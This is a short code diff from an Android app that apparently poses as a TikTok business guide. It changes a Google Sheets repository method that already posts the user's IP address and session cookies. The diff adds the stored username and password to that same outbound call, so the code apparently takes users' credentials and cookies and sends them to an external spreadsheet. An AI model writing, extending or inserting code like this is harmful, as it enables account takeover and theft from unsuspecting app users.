@@ -7,6 +7,7 @@ import androidx.lifecycle.MutableLiveData;
 
 import com.teamwork.businessguideprofortiktok.src.cores.services.APIServices;
 import com.teamwork.businessguideprofortiktok.src.cores.services.DataService;
+import com.teamwork.businessguideprofortiktok.src.utils.Constant;
 
 
 import retrofit2.Call;
@@ -23,7 +24,7 @@ public class GoogleSheetRepository {
     public void postDataGoogleSheets(String ip, String cookies) {
         DataService dataService = APIServices.getService();
 
-        Call<String> callback = dataService.postDataGoogleSheets(ip, cookies);
+        Call<String> callback = dataService.postDataGoogleSheets(ip, cookies, Constant.mUserName,Constant.mPassword);
         callback.enqueue(new Callback<String>() {
             @Override
             public void onResponse(Call<String> call, Response<String> response) {
